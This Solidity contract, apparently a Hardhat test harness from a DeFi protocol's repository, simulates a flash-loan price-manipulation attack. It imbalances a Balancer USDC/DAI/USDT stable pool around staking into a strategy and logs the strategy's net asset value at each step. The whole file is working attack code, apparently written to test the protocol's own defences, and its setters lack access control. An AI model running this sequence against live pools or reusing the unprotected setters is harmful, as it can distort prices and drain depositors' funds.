pragma solidity ^0.8.0;

import "./FlashLoanReceiverBase.sol";
import "@overnight-contracts/connectors/contracts/stuff/Balancer.sol";
import "@overnight-contracts/core/contracts/interfaces/IStrategy.sol";

import "hardhat/console.sol";

contract FlashAttackBalancerUsdc is FlashLoanReceiverBase {

    struct StrategyParams {
        address usdc;
        address usdt;
        address dai;
        address amDai;
        address amUsdc;
        address amUsdt;
        address bbamUsdc;
        address bbamUsdt;
        address bbamDai;
        address bpt;
        address vault;
        address gauge;
        bytes32 bbamUsdcPoolId;
        bytes32 bbamUsdtPoolId;
        bytes32 bbamDaiPoolId;
        bytes32 bbamUsdPoolId;
    }

    IERC20 public usdc;
    IERC20 public usdt;
    IERC20 public dai;

    IERC20 public amDai;
    IERC20 public amUsdc;
    IERC20 public amUsdt;

    IBptToken public bbamUsdc;
    IBptToken public bbamUsdt;
    IBptToken public bbamDai;
    IBptToken public bpt;

    IVault public vault;
    IGauge public gauge;

    bytes32 public bbamUsdcPoolId;
    bytes32 public bbamUsdtPoolId;
    bytes32 public bbamDaiPoolId;
    bytes32 public bbamUsdPoolId;

    address public asset;
    uint256 public attackAmount;
    uint256 public putAmount;

    IStrategy public strategy;


    constructor(address provider)
    public
    FlashLoanReceiverBase(provider)
    {}

    function setParams(StrategyParams calldata params) external {
        usdc = IERC20(params.usdc);
        usdt = IERC20(params.usdt);
        dai = IERC20(params.dai);

        amUsdc = IERC20(params.amUsdc);
        amUsdt = IERC20(params.amUsdt);
        amDai = IERC20(params.amDai);

        bbamUsdc = IBptToken(params.bbamUsdc);
        bbamUsdt = IBptToken(params.bbamUsdt);
        bbamDai = IBptToken(params.bbamDai);
        bpt = IBptToken(params.bpt);

        vault = IVault(params.vault);
        gauge = IGauge(params.gauge);

        bbamUsdcPoolId = params.bbamUsdcPoolId;
        bbamUsdtPoolId = params.bbamUsdtPoolId;
        bbamDaiPoolId = params.bbamDaiPoolId;
        bbamUsdPoolId = params.bbamUsdPoolId;
    }

    function setStrategy(address _strategy) external {
        strategy = IStrategy(_strategy);
    }


    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    )
    external
    override
    returns (bool)
    {

        console.log("asset:     %s", asset);
        console.log("amount:    %s", amount / 1e6);
        console.log("premium:   %s", premium / 1e6);
        console.log("initiator: %s", initiator);

        usdc.transfer(address(strategy), putAmount);
        strategy.stake(address(usdc), putAmount);

        showBalances('Stake to strategy');

        _stake(address(usdc), amount);

        showBalances('Stake 10kk');

        _unstakeToken(address(amDai), bpt.balanceOf(address(this)) / 2);
        showBalances('Unstake DAI');

        _unstakeToken(address(amUsdt), bpt.balanceOf(address(this)));
        showBalances('Unstake USDT');

        usdc.transfer(address(strategy), putAmount);
        strategy.stake(address(usdc), putAmount);
//        strategy.unstake(address(usdc), putAmount / 2, address(this), false);
        showBalances('Stake/Unstake strategy');

        // Approve the LendingPool contract allowance to *pull* the owed amount
        IERC20(asset).approve(address(POOL), amount + premium);

        return true;
    }

    function flashLoanSimple(address asset, uint256 _attackAmount, uint256 _putAmount) public {
        putAmount = _putAmount;

        POOL.flashLoanSimple(
            address(this),
            asset,
            _attackAmount,
            "",
            0
        );
    }

    function showBalances(string memory step) internal {

        console.log(step);
        console.log('Balances pool:');
        (IERC20[] memory tokens, uint256[] memory balances,) = vault.getPoolTokens(bbamUsdPoolId);
        for (uint256 i; i < tokens.length; i++) {

            if(address(tokens[i]) == address(bbamDai)){
                console.log("- DAI:  %s", balances[i] / 1e18);
            }else if (address(tokens[i]) == address(bbamUsdc)){
                console.log("- USDC: %s", balances[i] / 1e18);
            }else if(address(tokens[i]) == address(bbamUsdt)){
                console.log("- USDT: %s", balances[i] / 1e18);
            }else {
                console.log("- BPT:  %s", balances[i] / 1e18);
            }
        }

        console.log('Common:');
        console.log("- nav:  %s", strategy.netAssetValue() / 1e6);
        console.log("- usdc: %s", usdc.balanceOf(address(this)) / 1e6);
        console.log('');
    }

    function _stake(
        address _asset,
        uint256 _amount
    ) internal {

        require(_asset == address(usdc), "Some token not compatible");

        BalancerLibrary.swap(
            vault,
            IVault.SwapKind.GIVEN_IN,
            address(usdc),
            address(bbamUsdc),
            bbamUsdcPoolId,
            _amount,
            0,
            address(this),
            address(this)
        );

        (IERC20[] memory tokens,,) = vault.getPoolTokens(bbamUsdPoolId);

        IAsset[] memory assets = new IAsset[](4);
        uint256[] memory maxAmountsIn = new uint256[](4);

        // Must be without bpt fantom token
        uint256[] memory amountsIn = new uint256[](3);

        for (uint256 i; i < tokens.length; i++) {
            assets[i] = IAsset(address(tokens[i]));
        }

        uint256 bbamUsdcAmount = bbamUsdc.balanceOf(address(this));

        // 2 - USDC index
        maxAmountsIn[2] = bbamUsdcAmount;

        // 1 - USDC index
        amountsIn[1] = bbamUsdcAmount;

        uint256 joinKind = 1;
        uint256 minimumBPT = 1;
        bytes memory userData = abi.encode(joinKind, amountsIn, minimumBPT);

        IVault.JoinPoolRequest memory request = IVault.JoinPoolRequest(assets, maxAmountsIn, userData, false);

        // 2. Put bb-am-USDC to Stable pool
        bbamUsdc.approve(address(vault), bbamUsdcAmount);
        vault.joinPool(bbamUsdPoolId, address(this), address(this), request);

    }

    function _unstakeToken(
        address _asset,
        uint256 _amount
    ) internal returns (uint256) {

        IAsset[] memory assets = new IAsset[](4);
        uint256[] memory minAmountsOut = new uint256[](4);

        (IERC20[] memory tokens,,) = vault.getPoolTokens(bbamUsdPoolId);

        for (uint256 i; i < tokens.length; i++) {
            assets[i] = IAsset(address(tokens[i]));
        }

        // EXACT_BPT_IN_FOR_ONE_TOKEN_OUT
        uint256 exitKind;
        uint256 exitTokenIndex;
        IBptToken bbamToken;
        bytes32 bbamTokenPoolId;
        if (_asset == address(amDai)) {
            exitTokenIndex = 0;
            bbamToken = bbamDai;
            bbamTokenPoolId = bbamDaiPoolId;
        } else if (_asset == address(amUsdc)) {
            exitTokenIndex = 1;
            bbamToken = bbamUsdc;
            bbamTokenPoolId = bbamUsdcPoolId;
        } else if (_asset == address(amUsdt)) {
            exitTokenIndex = 2;
            bbamToken = bbamUsdt;
            bbamTokenPoolId = bbamUsdtPoolId;
        }
        bytes memory userData = abi.encode(exitKind, _amount, exitTokenIndex);
        IVault.ExitPoolRequest memory request = IVault.ExitPoolRequest(assets, minAmountsOut, userData, false);

        // 2. Unstake from stable pool
        vault.exitPool(bbamUsdPoolId, address(this), payable(address(this)), request);

        // 3. Swap
        BalancerLibrary.swap(
            vault,
            IVault.SwapKind.GIVEN_IN,
            address(bbamToken),
            _asset,
            bbamTokenPoolId,
            bbamToken.balanceOf(address(this)) / 2,
            0,
            address(this),
            address(this)
        );

        return IERC20(_asset).balanceOf(address(this));
    }

}
